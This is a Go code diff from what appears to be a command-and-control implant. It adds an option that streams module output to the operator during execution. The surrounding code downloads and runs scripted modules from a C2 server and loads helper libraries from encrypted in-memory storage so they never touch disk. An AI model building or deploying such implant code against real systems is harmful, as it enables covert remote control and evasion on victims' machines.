@@ -18,6 +18,24 @@ import (
 
 var fetchFile = c2transport.FetchFile
 
+// ModuleRunOption configures one module execution.
+type ModuleRunOption func(*moduleRunConfig)
+
+// moduleRunConfig holds per-run settings the module handler injects into the
+// script engine.
+type moduleRunConfig struct {
+	// notify streams output to the operator as it is produced. Nil disables
+	// streaming.
+	notify func(string)
+}
+
+// WithNotifier streams module output to the operator while it is still
+// running, instead of buffering it until the module returns. Long-lived
+// captures use it to report events as they happen.
+func WithNotifier(fn func(string)) ModuleRunOption {
+	return func(c *moduleRunConfig) { c.notify = fn }
+}
+
 // Wire the generic in-memory dependency resolver. coffloader, libbpf and any
 // future DLL/SO dependency are fetched from encrypted memfs/C2 on demand and
 // mapped only for the duration of the operation that needs them, so none is
@@ -61,9 +79,14 @@ func dependencyExt() string {
 }
 
 // ModuleHandler downloads and runs modules from C2 using resolved, typed invocation data
-func ModuleHandler(peerIP, file_to_download, payload_type, modName, checksum string, invocation def.ResolvedInvocation) (out string) {
+func ModuleHandler(peerIP, file_to_download, payload_type, modName, checksum string, invocation def.ResolvedInvocation, opts ...ModuleRunOption) (out string) {
 	// Canonicalize module names for download/cache keys across all module types.
 	modName = strings.ToLower(modName)
+
+	var runCfg moduleRunConfig
+	for _, opt := range opts {
+		opt(&runCfg)
+	}
 	defer func() {
 		if r := recover(); r != nil {
 			logging.Errorf("ModuleHandler panic executing %s (%s): %v\n%s", modName, payload_type, r, util.CallStack())
@@ -113,7 +136,10 @@ func ModuleHandler(peerIP, file_to_download, payload_type, modName, checksum str
 			var execErr error
 			// module_files exposes the memfs paths of all companion files so
 			// the script can load them without hardcoding paths.
-			out, execErr = script.Run(payload_data, invocation.Argv, map[string]any{"module_files": moduleFiles}, token)
+			out, execErr = script.Run(payload_data, invocation.Argv, map[string]any{"module_files": moduleFiles}, token,
+				script.WithModuleOwner(modName),
+				script.WithNotifier(runCfg.notify),
+			)
 			if execErr != nil {
 				out = logging.Sprintf("running starlark module: %v", execErr)
 			}
